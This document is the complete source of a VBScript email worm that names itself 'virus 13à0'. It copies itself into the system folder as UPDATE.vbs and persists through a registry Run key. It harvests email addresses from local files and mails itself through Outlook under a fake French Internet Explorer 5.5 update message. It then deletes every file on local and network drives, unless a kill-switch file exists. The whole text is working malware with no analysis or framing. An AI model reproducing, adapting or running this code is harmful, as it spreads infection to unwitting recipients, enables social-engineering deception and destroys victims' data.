On Error Resume Next
dim aaaa,bbbb,cccc
Set aaaa = CreateObject("Scripting.FileSystemObject")
if aaaa.FileExists("c:\testfile.txt") then
aagg()
else
Set cccc = aaaa.OpenTextFile("c:\testfile.txt", 2,true)
cccc.Write " "&vbcrlf
cccc.Close
set ie=createobject("InternetExplorer.Application")
   ie.navigate "http://www.microsoft.com/windows/ie/download/ie55.htm"
   ie.visible = true
aabb()
end if
sub aagg()
On Error Resume Next
aabb()
Dim dddd,eeee
Set eeee = aaaa.Drives
For Each dddd in eeee
If dddd.DriveType=2 Then
aacc(dddd.path&"\")
end if 
Next
ggbb()
end sub

sub aabb()
On Error Resume Next
dim ffff
Set bbbb = aaaa.GetSpecialFolder(1)
Set ffff = aaaa.GetFile(WScript.ScriptFullName)
ffff.Copy(bbbb&"\UPDATE.vbs")
CreateObject("WScript.Shell").regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\UPDATE",bbbb&"\UPDATE.vbs"
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
end sub

sub aacc(folderspec)  
On Error Resume Next
dim gggg,hhhh,iiii
set gggg =aaaa.GetFolder(folderspec)  
set iiii = gggg.SubFolders
for each hhhh in iiii
aadd(hhhh.path)
aacc(hhhh.path)
next  
end sub

sub aadd(folderspec)  
on error resume next
dim jjjj,kkkk,llll,mmmm,nnnn,oooo,ssss,pppp,rrrr,tttt,uuuu,vvvv,wwww,xxxx,yyyy,qqqq,zzzz
set jjjj = aaaa.GetFolder(folderspec)
set kkkk = jjjj.Files
for each llll in kkkk
mmmm=aaaa.GetExtensionName(llll.path)
mmmm=lcase(mmmm)
if (mmmm="wab") or (mmmm="txt") or (mmmm="htm") or (mmmm="html") then
Set nnnn = aaaa.OpenTextFile(llll.path,1)
oooo=nnnn.ReadAll
qqqq = nnnn.Line
Set nnnn = aaaa.OpenTextFile(llll.path,1)
for pppp=1 to qqqq-1
ssss= nnnn.ReadLine
for rrrr=1 to len(ssss)
if mid(ssss,rrrr,1)="@" then
tttt=rrrr-20
uuuu=rrrr+20
if tttt<1 then tttt=1
if uuuu>len(ssss) then uuuu=len(ssss)+1
wwww=1
for vvvv=tttt to rrrr
if mid(ssss,vvvv,1)<"-" then tttt=vvvv+1
if mid(ssss,vvvv,1)="/" then tttt=vvvv+1
if mid(ssss,vvvv,1)>"9" and mid(ssss,vvvv,1)<"@" then tttt=vvvv+1
if mid(ssss,vvvv,1)>"z" then wwww=0
next
if tttt=rrrr-35 then 
wwww=0
end if
if wwww=1 then
wwww=0
for vvvv=uuuu to rrrr step-1
if mid(ssss,vvvv,1)="." then wwww=1
if mid(ssss,vvvv,1)<"-" then uuuu=vvvv
if mid(ssss,vvvv,1)="/" then uuuu=vvvv
if mid(ssss,vvvv,1)>"9" and mid(ssss,vvvv,1)<"@" then uuuu=vvvv
next
end if
if rrrr-tttt<4 then wwww=0
if uuuu-rrrr<5 then wwww=0
yyyy=mid(ssss,tttt,uuuu-tttt)
if wwww=1 then
if mid(yyyy,uuuu-tttt-1,1)="." then wwww=0
if right(yyyy,1)="." then wwww=0
if left(yyyy,1)<"A" then wwww=0
end if
if wwww=1 then
Set cccc = aaaa.OpenTextFile("c:\testfile.txt",1)
rb=cccc.ReadAll
zzzz = cccc.Line
Set cccc = aaaa.OpenTextFile("c:\testfile.txt",1)
for n=1 to zzzz-1
xxxx= cccc.ReadLine
if xxxx=yyyy then 
wwww=0
n=zzzz
end if
next
if wwww=1 then
Set cccc = aaaa.OpenTextFile("c:\testfile.txt", 8)
cccc.Write yyyy&vbcrlf
aaee()
cccc.Close
end if
end if
end if
next
next
end if
next
End Sub
sub aaee()
on error resume next
dim regedit,out,male
set regedit=CreateObject("WScript.Shell")
Set out=WScript.CreateObject("Outlook.Application")
set male=out.CreateItem(0)
male.Recipients.Add(yyyy)
male.Subject = "UPDATE IEXPLORE 5.5"
male.Body = vbcrlf&"La toute nouvelle version de Microsoft Internet Explorer offre de nombreux avantages aux utilisateurs et aux développeurs. Vous apprécierez en particulier la nouvelle fonction d'aperçu avant impression qui permet d'afficher les pages telles qu'elles se présenteront à l'impression. Grâce à la prise en charge améliorée des langages DHTML et CSS, les concepteurs de sites Web seront en outre plus à même de contrôler l'apparence des pages et le fonctionnement du navigateur. Téléchargez tous ces éléments aujourd'hui à partir des mises a jour de produits"
male.Attachments.Add(bbbb&"\UPDATE.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&yyyy,1,"REG_DWORD"
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\00000001",1
set WshShell = WScript.CreateObject("WScript.Shell")
end sub 
WshShell.Run "outlook"

sub ggbb()
if aaaa.FileExists("c:\13a0.txt") then
MSGBOX "VIRUS 13à0 DISABLED"
else
ggaa()
end if
end sub 

sub ggaa()
On Error Resume Next
Dim d,dc
Set dc = aaaa.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
end sub

sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f =aaaa.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
dltfiles(f1.path)
folderlist(f1.path)
next  
end sub

sub dltfiles(folderspec)  
On Error Resume Next
dim f,f1,fc
set f = aaaa.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
aaaa.DeleteFile(f1.path)
next  
end sub
